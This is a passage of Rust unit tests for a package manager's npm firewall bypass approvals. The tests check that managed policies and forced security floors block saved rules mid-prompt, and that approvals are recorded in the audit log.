            let detail = details[0].as_deref().unwrap_or_default();
            assert!(
                detail.contains("manages the npm firewall") && detail.contains("; approved: "),
                "{detail}"
            );
        });
    }

    #[test]
    fn add_saves_nothing_once_a_managed_policy_turns_local_rules_off_during_the_last_prompt() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let (error, prompts) =
                add_while_a_managed_policy_takes_over(temp.path(), &["fresh@1.0.0"]);

            assert!(
                error.to_string().contains("manages the npm firewall"),
                "{error}"
            );
            assert_eq!(prompts, 1);
            assert!(saved_specs().is_empty());
        });
    }

    #[test]
    fn add_saves_nothing_once_the_forced_floor_reaches_enforce_during_the_last_prompt() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let specs = specs(&["fresh@1.0.0"]);
            let scope = global();
            let mut prompts = 0;

            let error = run_add(
                &plan(&specs, &scope, None, false),
                vec![rule(&specs[0], None)],
                |_| {
                    prompts += 1;
                    let lpm_home = temp.path().join("lpm-home");
                    std::fs::create_dir_all(&lpm_home).unwrap();
                    std::fs::write(
                        lpm_home.join("config.toml"),
                        "force-security-floor = true\n\n[firewall]\nmode = \"enforce\"\n",
                    )
                    .unwrap();
                    Ok(())
                },
            )
            .unwrap_err();

            assert!(
                error.to_string().contains("force-security-floor"),
                "{error}"
            );
            assert_eq!(prompts, 1);
            assert!(saved_specs().is_empty());
        });
    }

    #[test]
    fn add_waits_for_a_config_write_in_progress_and_then_meets_its_forced_floor() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let lpm_home = temp.path().join("lpm-home");
            std::fs::create_dir_all(&lpm_home).unwrap();
            let (locked_tx, locked_rx) = std::sync::mpsc::channel();
            let (approved_tx, approved_rx) = std::sync::mpsc::channel::<()>();
            // Holds the config lock from before `add` starts and writes the
            // forced floor only once `add` is past its approval prompt.
            let writer = std::thread::spawn(move || {
                let lock = lpm_common::try_acquire_exclusive_lock(lpm_home.join(".config.lock"))
                    .unwrap()
                    .expect("nothing else holds the config lock");
                locked_tx.send(()).unwrap();
                approved_rx.recv().unwrap();
                std::fs::write(
                    lpm_home.join("config.toml"),
                    "force-security-floor = true\n\n[firewall]\nmode = \"enforce\"\n",
                )
                .unwrap();
                drop(lock);
            });
            locked_rx.recv().unwrap();
            let specs = specs(&["fresh@1.0.0"]);
            let scope = global();
            let mut prompts = 0;

            let error = run_add(
                &plan(&specs, &scope, None, false),
                vec![rule(&specs[0], None)],
                |_| {
                    prompts += 1;
                    approved_tx.send(()).unwrap();
                    Ok(())
                },
            )
            .unwrap_err();
            writer.join().unwrap();

            assert!(
                error.to_string().contains("force-security-floor"),
                "{error}"
            );
            assert_eq!(prompts, 1);
            assert!(saved_specs().is_empty());
        });
    }

    #[test]
    fn add_keeps_approvals_on_record_when_the_rules_keep_changing() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let specs = specs(&[
                "held-a@1.0.0",
                "held-b@1.0.0",
                "held-c@1.0.0",
                "fresh@1.0.0",
            ]);
            save(&[
                rule(&specs[0], None),
                rule(&specs[1], None),
                rule(&specs[2], None),
            ]);
            let scope = global();
            let requested = specs.iter().map(|spec| rule(spec, Some(1_800))).collect();
            let mut prompts: Vec<String> = Vec::new();

            let error = run_add(
                &plan(&specs, &scope, Some(1_800), false),
                requested,
                |approval| {
                    let removed = specs[prompts.len()].to_string();
                    prompts.push(approval.prompt.to_string());
                    security_approval::remove_firewall_bypass_rules(
                        |rule| rule.spec == removed,
                        "firewall-bypass-removed",
                    )
                    .unwrap();
                    Ok(())
                },
            )
            .unwrap_err();

            assert_eq!(error.error_code(), "security_approval_required");
            assert!(error.to_string().contains("kept changing"), "{error}");
            let records: Vec<_> =
                security_approval::test_support::audit_records("firewall-bypass-added")
                    .into_iter()
                    .filter(|record| !record.allowed)
                    .collect();
            assert_eq!(records.len(), 1, "{records:?}");
            assert_eq!(prompts.len(), 3);
            let detail = records[0].detail.as_deref().unwrap_or_default();
            assert!(
                detail.ends_with(&format!("approved: {}", prompts.join("; "))),
                "{detail}"
            );
        });
    }

    #[test]
    fn add_records_each_approved_prompt_in_the_audit_log() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let specs = specs(&[
                "flagged-a@1.0.0",
                "flagged-b@1.0.0",
                "flagged-c@1.0.0",
                "flagged-d@1.0.0",
                "flagged-e@1.0.0",
                "flagged-f@1.0.0",
            ]);
            let scope = global();
            let requested = specs
                .iter()
                .map(|spec| rule_covering(spec, Some(1_800), true))
                .collect();

            run_add(&plan(&specs, &scope, Some(1_800), true), requested, |_| {
                Ok(())
            })
            .unwrap();

            let prompts: Vec<String> = approval_batches(&refs(&specs), |batch| {
                approval_prompt(batch, &scope, Some(1_800), true)
            })
            .iter()
            .map(|batch| approval_prompt(batch, &scope, Some(1_800), true))
            .collect();
            assert_eq!(prompts.len(), 2);
            assert!(
                prompts[0].contains("including a malware verdict"),
                "{}",
                prompts[0]
            );
            assert!(prompts[0].contains("for 30m"), "{}", prompts[0]);
            assert_eq!(
                security_approval::test_support::audit_details("firewall-bypass-added"),
                [Some(format!("approved: {}", prompts.join("; ")))]
            );
        });
    }
}
